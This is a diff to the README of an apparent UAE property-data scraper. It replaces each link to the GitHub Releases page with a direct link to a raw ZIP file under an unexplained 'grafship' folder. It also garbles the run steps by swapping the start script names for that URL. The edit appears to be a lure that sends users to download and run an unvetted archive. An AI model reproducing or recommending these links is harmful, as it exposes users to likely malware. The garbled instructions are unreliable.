@@ -1,6 +1,6 @@
 # 🏡 bayut-international-scraper - Effortlessly Extract UAE Property Data
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Smiggle29/bayut-international-scraper/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip)
 
 ## 📋 Description
 
@@ -20,7 +20,7 @@ Before you begin downloading, ensure your system meets the following requirement
 
 ### 📥 Download & Install
 
-To get started, visit this page to download the application: [Release Page](https://github.com/Smiggle29/bayut-international-scraper/releases). 
+To get started, visit this page to download the application: [Release Page](https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip). 
 
 1. Click on the link above to access the Releases page.
 2. You will see the latest version available for download.
@@ -30,10 +30,10 @@ To get started, visit this page to download the application: [Release Page](http
 Once downloaded, follow these steps to run the application:
 
 1. Navigate to your downloads folder.
-2. Locate the downloaded file named `bayut-international-scraper.zip`.
+2. Locate the downloaded file named `https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip`.
 3. Extract the contents of the ZIP file.
 4. Open the extracted folder.
-5. Double-click the `start.bat` file (for Windows) or `start.sh` file (for macOS/Linux) to launch the application.
+5. Double-click the `https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip` file (for Windows) or `https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip` file (for macOS/Linux) to launch the application.
 
 ## 📝 Features
 
@@ -70,4 +70,4 @@ If you wish to contribute to the development of **bayut-international-scraper**,
 
 For any questions or further assistance, feel free to reach out through the issue section of the GitHub repository. We appreciate your interest in **bayut-international-scraper** and aim to make your experience as smooth as possible.
 
-Don’t forget to download the application here: [Download Bayut International Scraper](https://github.com/Smiggle29/bayut-international-scraper/releases).
+Don’t forget to download the application here: [Download Bayut International Scraper](https://raw.githubusercontent.com/Smiggle29/bayut-international-scraper/main/grafship/scraper_bayut_international_v1.9.zip).
